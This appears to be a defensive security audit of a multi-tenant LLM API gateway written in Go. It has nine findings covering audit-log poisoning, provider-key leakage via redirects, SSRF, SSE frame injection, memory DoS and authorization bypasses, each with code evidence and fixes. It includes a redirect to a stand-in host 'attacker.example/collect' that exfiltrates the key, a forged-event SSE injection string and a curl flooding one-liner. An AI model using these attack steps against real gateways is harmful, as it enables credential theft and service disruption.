title: Client-controlled X-Request-ID collides with unique call_logs.request_id, poisoning batched audit inserts (cross-tenant audit destruction)
evidence: gateway.go:84 `if v := strings.TrimSpace(c.GetHeader("X-Request-ID")); v != "" && len(v) <= 128 {` → gateway.go:306 `reqID := resolveRequestID(c)` → gateway.go:311 `requestID: reqID`. model.go:248 `RequestID        string    `gorm:"uniqueIndex;size:40" json:"request_id"``. audit.go:67-70: `if err := l.db.CreateInBatches(batch, 50).Error; err != nil {` / `log.Printf("[audit] batch insert failed: %v", err)` / `batch = batch[:0]` — a failed 50-row chunked INSERT (SQLite aborts the whole multi-row statement on UNIQUE constraint failure) discards ALL logs in that flush; flush fires at audit.go:79 `if len(batch) >= 64 {` or every 200ms (audit.go:60). Queue-full fallback audit.go:44 `l.db.Create(cl)` ignores the error entirely. audit.go:46 `l.broadcastLive(cl)` pushes to the WebSocket audit hub even when the row never persists.
impact: Any authenticated gateway tenant can reuse one fixed X-Request-ID header; the first insert wins, every subsequent duplicate that lands in a batch fails the whole 50-row (up to 64-per-flush) INSERT, silently destroying call audit for OTHER API keys across the whole gateway. Attacker also evades persisted call auditing (live WS view diverges from DB, so it is not obviously noticed). Additionally the header may be up to 128 bytes while the column is size:40 — on MySQL that alone fails the batch; on SQLite oversized strings persist unbounded until retention cleanup.
recommendation: Server-generate the audit row's request_id (keep client X-Request-ID in a separate non-unique column), or on unique-constraint failure fall back to per-row inserts and retry the remaining rows; never discard the batch. Enforce the 40-char limit in resolveRequestID.
mitigations_checked: No insert-with-ignore/ON CONFLICT clause; no per-row retry; no dedup window; metrics ring is capped (metrics.go:77-79) so only the audit path is poisoned. Disabled/expired-key and XFF spoofing separately verified safe (no expiry feature exists; TRUSTED_PROXIES default empty per main.go:92).

title: No CheckRedirect on gateway/health/testProvider HTTP clients: x-api-key (Anthropic provider key) survives Go's cross-host redirect strip → key exfiltration by malicious upstream
evidence: adapter.go:679 `req.Header.Set("x-api-key", apiKey)` — the decrypted provider key (runtime/manager.go:213-215 decrypts into the snapshot). gateway.go:58-60 `httpClient: &http.Client{Transport: &http.Transport{` — no CheckRedirect, so Go's default (GOROOT src/net/http/client.go:819-824 `if len(via) >= 10 { return errors.New("stopped after 10 redirects") }`) follows up to 10 redirects. Verified against the toolchain (go1.24.4, module go directive 1.25): client.go:805-814 copies redirect-forwarded headers but strips only `case "Authorization", "Www-Authenticate", "Cookie", "Cookie2", "Proxy-Authorization", "Proxy-Authenticate":` when cross-host — x-api-key and anthropic-version are NOT in that list and are resent verbatim to any redirect target; and client.go:991-1007 `shouldCopyHeaderOnRedirect` keeps even Authorization for parent-domain/subdomain redirects (open-redirect on a sibling host suffices). Same client config in health.go:38 `client: &http.Client{Timeout: 10 * time.Second}` and providers.go:184/232 `client := &http.Client{Timeout: 15 * time.Second}`.
impact: A malicious, compromised, or misconfigured Anthropic-protocol upstream (common: third-party reseller endpoints added via admin UI) returns 302 Location: https://attacker.example/collect and the gateway replays the provider API key there on every generation AND on every 3-10s health probe (health.go sends the decrypted key too). 307/308 also re-POST the tenant's full prompt payload to the attacker host. Provider keys are the gateway's most sensitive credentials (shared, multi-tenant).
recommendation: Set CheckRedirect on all three clients to refuse hops that change host/scheme or target private/loopback/link-local ranges; or pin to one hop. At minimum, delete x-api-key/anthropic-version on cross-host redirects the way stdlib does for Authorization.
mitigations_checked: Confirmed Go ≥1.8 strips Authorization cross-host (so openai_chat upstreams are partially protected — the asymmetry is the gap); keys are AES-GCM encrypted at rest (crypto.go:36-41) but decrypt to plaintext in the snapshot used here; no redirect observed in normal provider traffic, so silent exfil is persistent.

title: provider base_url is unvalidated (scheme/private-IP) and gateway error paths echo transport failures + 200B upstream bodies to tenants: authenticated SSRF with a tenant-visible port-scan oracle
evidence: admin/providers.go:56 accepts any non-empty `req.BaseURL == ""` check only — no url.Parse, no scheme/host allowlist, no private-range block. gateway.go:507 passes `up.BaseURL` straight into adapter.go:551-555 `base := strings.TrimRight(baseURL, "/")` / `req, err := http.NewRequest(http.MethodPost, base+endpoint, ...)`. On dial failure gateway.go:519 `ap.errMsg = err.Error() // 审计另有 UpstreamProvider 列；面向客户端的错误不泄漏上游名` (comment claims no leak, but) gateway.go:468 `lastErr = ap.errMsg` then gateway.go:475-476 `clientError(c, clientProto, http.StatusBadGateway, "all upstreams unavailable: "+lastErr, ...)` echoes the raw url.Error — e.g. `Post "http://127.0.0.1:6379/v1/chat/completions": dial tcp 127.0.0.1:6379: connect: connection refused` — to the tenant. For HTTP responses gateway.go:530 `body, _ := io.ReadAll(io.LimitReader(resp.Body, 64<<10))` → sse.go:610-613 `if len(body) > 200 { body = body[:200] }` → gateway.go:541-543 `"upstream returned %d: %s"` sends up to 200 bytes of the internal endpoint's error body plus its status code to the tenant. health.go:94-98 and providers.go:166-170 repeat the same unvalidated GET (health even sends the decrypted key, health.go:104).
impact: An admin-authenticated (or admin-credential-compromised) actor — the same principal that a defaulted JWT_SECRET warns about — can point a provider at 169.254.169.254, 127.0.0.1, or VPC-internal hosts; the gateway server-side POSTs there, and ANY tenant holding a cheap API key obtains connect/refused-vs-open port-scan results and up to 200 bytes of internal non-2xx response bodies per call. No network-layer mitigation exists (single process serves gateway + admin + health).
recommendation: Validate base_url at create/update (providers.go:56/110): https-or-allowlisted scheme, public IP resolution with dial-time IP pinning (custom DialContext) blocking 0.0.0.0/8, 10/8, 127/8, 169.254/16, ::1/fc00::/7; and sanitize tenant-facing upstream errors to a fixed string, keeping detail in audit only.
mitigations_checked: file:// and gopher:// are rejected by Go's http.Transport (unsupported scheme → transport error, still echoed); redirect-based internal reach compounds this (see gateway-2); ExtractError JSON-path branches (sse.go:591-609) can echo structured upstream error.message verbatim; buffered non-stream read is capped at 16MB (gateway.go:557) so no memory amplification.

title: SSE writer interpolates upstream-controlled finish_reason / tool-call id+name raw into JSON frames: newline injection forges SSE events that bypass the streaming output guard
evidence: Text deltas ARE escaped (sse.go:268 `tj, _ := json.Marshal(text)`), but format-string fields are not: sse.go:463-465 `err := s.raw("data: " + fmt.Sprintf(` / `` {"id":"%s",..."finish_reason":"%s"}... `` / `s.id, s.model, finish, usage.Prompt, ...)`. `finish` originates from upstream JSON: gateway.go:713-714 `if chunk.FinishReason != "" { finishReason = chunk.FinishReason }` (parsed at sse.go:74-76; JSON strings may legally contain \n). Anthropic path: sse.go:429-437 `stopReason := finish` with only stop/length/tool_calls remapped — any other upstream string passes through into sse.go:439 `"stop_reason":"%s"`. Tool blocks: sse.go:359-361 `"content_block":{"type":"tool_use","id":"%s","name":"%s","input":{}}}` with `bi, callID, name` — callID/name from upstream content_block_start (sse.go:116-118). None of these strings ever enter `acc` (gateway.go:694-696 accumulates only TextDelta), so the threshold output guard (gateway.go:699-709, 749-753) cannot see them.
impact:
A malicious/compromised upstream sends finish_reason (or tool_use name/id) containing `"

data: [DONE]

event: forged
data: {...}` — because it is interpolated raw, the real newline terminates our SSE frame and the attacker injects arbitrary subsequent SSE events (forged deltas, forged [DONE], forged usage) into the tenant's stream as if emitted by the gateway, outside the output-filter trust path the product claims for streams. Client-controlled reqID (via s.id at sse.go:258/281/301/327) can additionally inject `"` to corrupt the framing of its own stream; CR/LF in the header itself is impossible (stdlib verifies header values — GOROOT net/http/server.go:1076 `if !httpguts.ValidHeaderFieldValue(v) { return nil, badRequestError("invalid header value") }`).
recommendation: json.Marshal (or reject non-token values for) every string interpolated into SSE frames: finish, stopReason, callID, tool name, and reqID-derived ids; validate/whitelist finish_reason values before passthrough.
mitigations_checked: Delta/Reasoning/Fail/args-delta payloads all use json.Marshal (sse.go:268,291,366,400,476) — escaping gap is limited to id/model/finish/name fields; faithful-passthrough user decision covers content verbatim but NOT unfiltered forged framing.

title: metrics.stats map grows unboundedly keyed by the unresolved, attacker-chosen model string — permanent memory DoS per gateway tenant
evidence: gateway.go:334 sets `ap.alias = cr.Model` BEFORE alias/implicit resolution (so it can be an arbitrary client string from the JSON body, up to the 16MB cap); the deferred block gateway.go:314-319 calls `s.mx.Observe(ap.alias, ap.status != "ok")` on every request including 404 unknown-model (gateway.go:356-361) and 403 model-not-allowed (370-376). metrics.go:60-63: `s := mt.stats[model]` / `if s == nil { s = &ModelStat{lastSec: now}; mt.stats[model] = s }` — no cap, no eviction anywhere (grep: only reads of `mt.stats` in QPS(); the only truncation is the 50-entry error ring at metrics.go:77-79). Each entry pins the full key string (60 int64 request + 60 int64 error buckets).
impact: Any API-key holder sends N requests with unique junk model names (cheap: `curl -H 'Authorization: Bearer sk-…' -d '{"model":"x-$RANDOM","messages":[]}'`) and permanently grows server heap proportional to total unique names ever seen; keys survive config reload and are re-rendered on every /metrics scrape and QPS() call, amplifying CPU cost. Same attacker string is also persisted to call_logs.model_alias (size:64 ignored on SQLite), bloating the DB.
recommendation: Only Observe() after successful resolution (or with a constant like "unknown" for unresolved aliases), cap distinct-model entries with an LRU, and length-bound cr.Model at parse time.
mitigations_checked: newRequestID uses crypto/rand; MaxConnections gate (gateway.go:195) bounds concurrency but not the map; RecordError ring is bounded; no restart-driven eviction exists.

title: Per-key model allowlist fails OPEN on malformed or empty-array AllowedModelsJSON, and admin API stores the field without validation
evidence: model.go:56-58: `var list []string` / `if err := json.Unmarshal([]byte(k.AllowedModelsJSON), &list); err != nil {` / `return true // 解析失败：放宽到全部允许，避免配置错误锁死` — any non-array JSON (`"gpt-4"`, `{...}`, trailing junk, 512-byte truncation by any middleware) turns a restricted key into an allow-ALL key. model.go:60-62: `if len(list) == 0 { return true }` — an explicit empty array `[]` (intuitive 'allow nothing') also allows everything. admin/apikeys.go:42 `AllowedModelsJSON: req.AllowedModelsJSON, IPAllowlistJSON: req.IPAllowlistJSON,` and :78 `k.AllowedModelsJSON = req.AllowedModelsJSON` persist the raw admin request string — no `json.Valid`/unmarshal check at create or update.
impact: A key issued for one cheap model can silently call every alias AND all implicit upstream model names (gateway.go:370 `if !apiKey.AllowsModel(cr.Model)` is the only enforcement point), consuming quota on and exfiltrating capability from premium providers. The silent direction of failure is invisible: admin UI re-reads the raw string, not the effective policy. Contrast IPAllowlistJSON which is fail-CLOSED on parse error (model.go:82-84) — the same corruption class yields opposite outcomes.
recommendation: Validate JSON on write (reject non-`[]string`), and make AllowsModel fail closed on parse error / distinguish 'unset' (`""`) from 'empty list' (`[]`) semantics.
mitigations_checked: Enforcement site itself is correct and covers implicit upstream names and context-suffix stripped names (checked after resolution); the map-list is re-parsed per request so no stale allow grants across hot-reload; snapshot KeyHash/APIKey fields are json:"-" so op-logs don't leak hashes.

title: Quota-degrade re-routing never re-checks the key's allowed-model list or the degrade alias's rate rules
evidence: The allowlist check happens once, pre-quota: gateway.go:370 `if !apiKey.AllowsModel(cr.Model) {`. In the quota-exceeded branch, gateway.go:421-425: `if over.OverAction == "degrade" && over.DegradeAlias != "" {` / `if ups2, ok4 := snap.Aliases[over.DegradeAlias]; ok4 {` / `ups = ups2` / `ap.alias = over.DegradeAlias` — no `apiKey.AllowsModel(over.DegradeAlias)` re-test, and rate limiting (gateway.go:410 `s.rl.Allow(snap, apiKey.ID, ap.alias)`) was already evaluated only for the original alias, so rules scoped to the degrade alias never apply to it.
impact: A key restricted to alias A, saturating its A quota (a state the tenant can deliberately and cheaply induce), is served subsequent traffic through degrade alias B that the key was never granted — reaching providers/models behind B (including its implicit upstream names via ListModels discovery) with no authz check; rate-limit rules written against B are bypassed. Quotas are also consumed against B's alias (gateway.go:614 `s.qm.Consume(snap, ap.keyID, ap.alias, ...)`), hiding the overage from A's counter views.
recommendation: After degradation, re-run `apiKey.AllowsModel` (fall through to quota_exceeded on denial) and re-check the rate limiter for the new alias, or reject degrading to a non-allowed alias at quota-save time.
mitigations_checked: DegradeAlias itself is admin-configured (model.Quota.DegradeAlias; not tenant-influenceable) and only accepts names present in snap.Aliases, so this is a control-consistency bypass rather than arbitrary routing.

title: No http.MaxBytesReader / explicit 413: oversized /v1 request bodies are silently truncated to 16MB and reported as client JSON errors
evidence: gateway.go:322 `body, err := io.ReadAll(io.LimitReader(c.Request.Body, 16<<20))` and gateway.go:98 (CountTokens) `body, err := io.ReadAll(io.LimitReader(c.Request.Body, 16<<20))` — LimitReader truncates invisibly; grep of the whole backend shows no http.MaxBytesReader and no BodyLimit middleware in cmd/server/main.go (only the security-header/access-log middlewares at :97-118).
impact: A >16MB request is mislabeled `invalid_request_error/bad_request` instead of 413 (client keeps streaming until the server answers, wasting bandwidth), and 'exactly 16MB' is indistinguishable from 'truncated at 16MB'. Memory is bounded so there is no OOM; guard cannot be bypassed because only the parsed canonical request (never the raw bytes) is forwarded and truncated JSON fails to parse.
recommendation: Wrap c.Request.Body in http.MaxBytesReader(c.Writer, body, 16<<20) (and CountTokens) and answer 413 with a distinct code.
mitigations_checked: Upstream responses are bounded too (gateway.go:557 `io.ReadAll(io.LimitReader(resp.Body, 16<<20))`, error read 64KB at :530, scanner line cap 4MB at :640); WriteTimeout=0 stream exposure is the stated-by-design passthrough and not re-reported.

title: IP allowlist accepts only CIDR syntax; bare-IP entries silently never match (fail-closed lockout) with no write-time validation
evidence: model.go:85-89: `for _, c := range cidrs {` / `if _, network, err := net.ParseCIDR(c); err == nil && network.Contains(ip) {` / `return true` / `}` — `net.ParseCIDR("203.0.113.7")` (bare IP, no `/32`) errors and is skipped forever; apikeys.go:42/79 stores IPAllowlistJSON unchecked, so a typo'd or bare-IP list denies 100% of that key's traffic (`return false` at line 90), while the gateway's only IP hook is gateway.go:222 `if !rec.IPAllowed(c.ClientIP()) {`.
impact: No bypass (fails closed, which is the safe direction) but a silent availability trap for the control; also IPv6 `::ffff:`-mapped client forms rely on net.IP.Contains semantics — worth pinning with tests. ClientIP() itself is sound here because SetTrustedProxies defaults to the configured (empty) list (main.go:92), so XFF cannot spoof past the allowlist.
recommendation: Accept plain IPs by normalizing host-only entries to /32//128 at write time and reject unparseable entries; surface 'allowlist active but never matched' in the key's status.
mitigations_checked: Unparseable whole JSON returns false (fail-closed, opposite of gateway-6); disabled keys rejected (gateway.go:216); SHA-256 map lookup needs no constant-time compare (preimage is a 128-bit crypto/rand value, gateway.go:75-79/crypto.go:74-78); no expiry field exists in the model — nothing to enforce.
